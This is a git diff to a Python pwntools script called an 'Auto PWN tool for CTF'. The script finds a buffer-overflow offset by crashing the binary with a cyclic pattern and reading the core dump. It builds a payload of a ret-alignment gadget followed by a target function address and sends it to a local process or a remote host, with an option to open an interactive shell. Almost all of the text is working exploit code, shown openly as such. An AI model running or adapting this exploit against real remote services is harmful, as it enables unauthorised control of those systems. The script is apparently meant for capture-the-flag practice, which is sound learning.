@@ -38,6 +38,7 @@ if __name__ == "__main__":
 
     print_banner()
 
+    # Arguments of the tool
     parser = argparse.ArgumentParser(description="Auto PWN tool for CTF")
     parser.add_argument('-vv', action="store_true", dest="moreVerbose", required=False, help="Max Verbose (debug)")
     parser.add_argument('-v', action="store_true", dest="verbose", required=False, help="Verbose (info)")
@@ -48,50 +49,55 @@ if __name__ == "__main__":
     parser.add_argument('--shell', action="store_true", dest="shell", required=False, help="Stay interactive")
     parser.add_argument('--remote', action="store_true", dest="remote", required=False, help="Exploit remote server")
 
-
+    # Basic variables and context
     results = parser.parse_args()
     file = context.binary = results.file
     target = results.target
     elf = ELF(file)
 
+    assert target in elf.symbols
+    target = elf.symbols.get(target) # Get address of target function
+
+    # Verbosity
     if (results.verbose):
         context.log_level = "info"
     if (results.moreVerbose):
         context.log_level = "debug"
 
-    assert target in elf.symbols
-    target = elf.symbols.get(target)
-
-
-    # Generate a cyclic pattern so that we can auto-find the offset
+    # Create cyclic pattern and crash the program using it
     payload = cyclic(1000)
 
-    # Run the process once so that it crashes
     io = process(file)
     io.sendline(payload)
     io.wait()
 
-    # Get the core dump
-    core = Coredump('./core')
-
-    # Our cyclic pattern should have been used as the crashing address
+    # Get core dump and analyse it to get the offset of the instruction pointer
+    core = io.corefile
+    io.close()
 
     if elf.elfclass==32:
         assert pack(core.eip) in payload
-        offset=cyclic_find(core.eip)
+        offset=cyclic_find(core.eip)                # Offset for 32 bit executables
     else:
-        assert core.read(core.rsp,4) in payload
-        offset=cyclic_find(core.read(core.rsp,4))
+        assert core.read(core.rsp,4) in payload     
+        offset=cyclic_find(core.read(core.rsp,4))   # Offset for 64 bit executables 
 
     if results.offset:
-        print("\n[*] Offset: {}".format(offset))
+        print("\n[*] Offset: {}\n".format(offset))
 
+    rop=ROP(file)
+    ret=rop.ret.address                             # Bypass movaps in system 
+
+    # PAYLOAD
     payload = flat({
-        offset: target
+        offset: [
+            ret,
+            target
+        ]
     })
 
-    
-    if(results.remote):
+    # Remote or local explotation
+    if results.remote:
         ip = input("IP/DOMAIN: ").strip()
         port = input("PORT: ")
         io = remote(ip,port)
@@ -101,14 +107,20 @@ if __name__ == "__main__":
     if results.gdbDebug:
         gdb.attach(io)
 
+    # Send payload
     io.send(payload)
+    io.sendline(b"\n")
 
+    # Get the flag or a shell
     if results.shell:
         io.interactive()
     else:   
-        io.sendline(b"\n"*5)
         print("\n[*] Possible flag:")
         print(colored ("\t{}\n".format(io.recvall()), "green"))
-    
-    del core
-    os.remove('core')
+
+    # Remove the generated corefiles and close the conection
+    os.remove(core.file.name)
+    io.wait()
+    if not results.remote:
+        os.remove(io.corefile.file.name)
+    io.close()
